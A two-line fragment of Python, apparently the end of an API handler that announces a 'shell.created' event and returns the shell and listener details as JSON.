    manager.push("shell.created", shell=out.model_dump())
    return {"ok": True, "shell": out.model_dump(), "listener": lis.to_dict()}
